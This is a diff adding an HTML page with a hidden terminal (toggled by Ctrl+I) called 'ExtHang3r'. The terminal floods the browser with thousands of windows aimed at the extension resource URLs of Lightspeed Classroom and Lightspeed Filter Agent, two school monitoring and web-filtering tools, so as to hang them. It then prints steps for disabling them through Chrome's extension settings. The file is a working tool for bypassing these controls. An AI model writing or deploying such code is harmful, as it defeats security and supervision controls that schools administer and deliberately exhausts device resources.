@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>poopy</title>
+    <style>
+      body {
+        margin: 0;
+        height: 100vh;
+        background-color: #f8f9fa;
+      }
+
+      #terminal-container {
+        position: fixed;
+        bottom: 20px;
+        right: 20px;
+        width: 500px;
+        background-color: #1a1a1a;
+        border-radius: 5px;
+        padding: 20px;
+        box-shadow: 0 0 10px rgba(0,0,0,0.5);
+        display: none;
+      }
+
+      #output {
+        height: 300px;
+        overflow-y: auto;
+        color: #fff;
+        font-family: monospace;
+        margin-bottom: 15px;
+      }
+
+      .input-container {
+        display: flex;
+        align-items: center;
+        gap: 10px;
+      }
+
+      #input {
+        flex-grow: 1;
+        background-color: #1a1a1a;
+        border: none;
+        color: #fff;
+        font-family: monospace;
+        padding: 8px;
+        caret-color: #fff;
+      }
+
+      #input:focus {
+        outline: none;
+      }
+
+      #enter-btn {
+        background-color: #2196F3;
+        color: white;
+        border: none;
+        padding: 8px 20px;
+        border-radius: 3px;
+        cursor: pointer;
+        font-family: monospace;
+      }
+
+      #enter-btn:hover {
+        background-color: #1976D2;
+      }
+
+      .overlay {
+        position: fixed;
+        top: 0;
+        left: 0;
+        width: 100%;
+        height: 100%;
+        background-color: rgba(0, 0, 0, 0.7);
+        display: none;
+        justify-content: center;
+        align-items: center;
+        z-index: 9999;
+        color: #fff;
+        font-size: 24px;
+        user-select: none;
+        flex-direction: column;
+      }
+
+      .spinner {
+        border: 6px solid rgba(255, 255, 255, 0.3);
+        border-top: 6px solid #fff;
+        border-radius: 50%;
+        width: 40px;
+        height: 40px;
+        animation: spin 1s linear infinite;
+        margin-bottom: 20px;
+      }
+
+      @keyframes spin {
+        0% { transform: rotate(0deg); }
+        100% { transform: rotate(360deg); }
+      }
+
+      .command {
+        color: #4CAF50;
+      }
+
+      .response {
+        margin-bottom: 10px;
+      }
+    </style>
+  </head>
+  <body>
+    <div id="terminal-container">
+      <div id="output"></div>
+      <div class="input-container">
+        <input type="text" id="input" placeholder="Enter command...">
+        <button id="enter-btn">ENTER</button>
+      </div>
+    </div>
+
+    <div class="overlay" id="overlay">
+      <div class="spinner"></div>
+      Hanging... (This will take about 1 minute)
+    </div>
+    <script>
+      const commands = {
+        'disablelightspeedclassroom': {
+          url: 'chrome-extension://kkbmdgjggcdajckdlbngdjonpchpaiea/assets/icon-classroom-128.png',
+          name: 'Lightspeed Classroom'
+        },
+        'disablelightspeedfilter': {
+          url: 'chrome-extension://adkcpkpghahmbopkjchobieckeoaoeem/icon-128.png',
+          name: 'Lightspeed Filter Agent'
+        }
+      };
+
+      let iframeCount = 3000;
+      let maxIframeCount = 15000;
+      let hangStartTime = null;
+      let hangInterval = null;
+      let activeTabs = [];
+
+      const outputEl = document.getElementById('output');
+      const inputEl = document.getElementById('input');
+      const terminalEl = document.getElementById('terminal-container');
+      const enterBtn = document.getElementById('enter-btn');
+      const overlay = document.getElementById('overlay');
+
+      function print(line) {
+        outputEl.innerHTML += `<div class="response">${line}</div>`;
+        outputEl.scrollTop = outputEl.scrollHeight;
+      }
+
+      function processCommand(command) {
+        const [cmd, ...args] = command.split(' ');
+        inputEl.value = '';
+        
+        switch (cmd.toLowerCase()) {
+          case 'disablelightspeedclassroom':
+          case 'disablelightspeedfilter':
+            if (commands[cmd]) {
+              print(`<span class="command">> ${command}</span>`);
+              executeHang(commands[cmd]);
+            }
+            break;
+          case 'controls':
+            print("Available controls:");
+            print("- disablelightspeedclassroom: Disable Lightspeed Classroom");
+            print("- disablelightspeedfilter: Disable Lightspeed Filter");
+            print("- tabs: Show current number of tabs");
+            print("- tabs set max: Set tabs to maximum");
+            print("- tabs set <number>: Set custom number of tabs");
+            print("- iframes: Show current iframe count and time remaining");
+            break;
+          case 'tabs':
+            handleTabsCommand(args);
+            break;
+          case 'iframes':
+            handleIframesCommand();
+            break;
+          default:
+            print(`Error: Unknown command '${cmd}'`);
+        }
+      }
+
+      function handleTabsCommand(args) {
+        if (args[0] === 'set') {
+          if (args[1] === 'max') {
+            iframeCount = maxIframeCount;
+            print(`Tabs set to maximum: ${iframeCount}`);
+          } else if (!isNaN(args[1])) {
+            const newCount = Math.min(Number(args[1]), maxIframeCount);
+            iframeCount = newCount;
+            print(`Tabs set to: ${iframeCount}`);
+          }
+        } else {
+          print(`Current number of tabs: ${iframeCount}`);
+        }
+      }
+
+      function handleIframesCommand() {
+        if (hangStartTime) {
+          const elapsed = Math.floor((Date.now() - hangStartTime) / 1000);
+          const remaining = Math.max(0, 60 - elapsed);
+          print(`Active iframes: ${iframeCount}`);
+          print(`Time remaining: ${remaining} seconds`);
+        } else {
+          print("No active hanging process");
+        }
+      }
+
+      function executeHang(target) {
+        print(`Initializing hang sequence for ${target.name}...`);
+        hangStartTime = Date.now();
+        overlay.style.display = "flex";
+
+        // Create multiple tabs
+        for (let i = 0; i < iframeCount; i++) {
+          const tab = window.open(target.url, `tab-${i}`);
+          if (tab) activeTabs.push(tab);
+        }
+
+        hangInterval = setInterval(() => {
+          const elapsed = Math.floor((Date.now() - hangStartTime) / 1000);
+          if (elapsed >= 60) {
+            clearInterval(hangInterval);
+            finishHangProcess(target);
+          }
+        }, 1000);
+      }
+
+      function finishHangProcess(target) {
+        overlay.style.display = "none";
+        print(`${target.name} hanged successfully!`);
+        showKillInstructions(target);
+        closeAllTabs();
+      }
+
+      function showKillInstructions(target) {
+        const extensionId = target.url.split('/')[2];
+        print(`Final steps to kill ${target.name}:`);
+        print(`1. Open chrome://extensions/?id=${extensionId}`);
+        print(`2. Toggle "Allow access to file URLs" twice`);
+        print(`3. Close the extensions tab when done`);
+      }
+
+      function closeAllTabs() {
+        activeTabs.forEach(tab => {
+          try {
+            if (!tab.closed) tab.close();
+          } catch (e) {
+            console.log("Tab already closed");
+          }
+        });
+        activeTabs = [];
+      }
+
+      // Event Listeners
+      inputEl.addEventListener('keypress', (e) => {
+        if (e.key === 'Enter') processCommand(inputEl.value);
+      });
+
+      enterBtn.addEventListener('click', () => {
+        processCommand(inputEl.value);
+      });
+
+      document.addEventListener('keydown', (e) => {
+        if (e.ctrlKey && e.key === 'i') {
+          e.preventDefault();
+          terminalEl.style.display = terminalEl.style.display === 'none' ? 'block' : 'none';
+          if (terminalEl.style.display === 'block') inputEl.focus();
+        }
+      });
+
+      // Initialization
+      print("ExtHang3r Terminal v1.0");
+      print("Type 'controls' for available commands\n");
+    </script>
+  </body>
+</html>
